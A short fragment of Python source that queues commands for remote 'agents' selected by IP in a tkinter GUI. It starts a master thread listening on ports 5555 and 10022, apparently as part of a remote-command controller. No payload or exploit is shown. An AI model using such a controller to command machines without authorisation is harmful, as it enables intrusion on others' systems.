            agent = (selected_ip.strip(), selected_port)
            current_output_tab = button_name
            agent_pool.put((agent, selected_ip.strip(), command))
    except tk.TclError:
        print("No item selected in the listbox.")


if __name__ == "__main__":
    master_addr = ('0.0.0.0', 5555)
    customer_addr = ('0.0.0.0', 10022)

    # Create the pending_customers queue
    pending_customers = queue.Queue()

    # Thread for running the master
    master_thread = threading.Thread(target=run_master, args=(master_addr, customer_addr, pending_customers))
    master_thread.start()

    # Thread for running the GUI
    gui_thread = threading.Thread(target=create_gui, args=(pending_customers,))
    gui_thread.start()
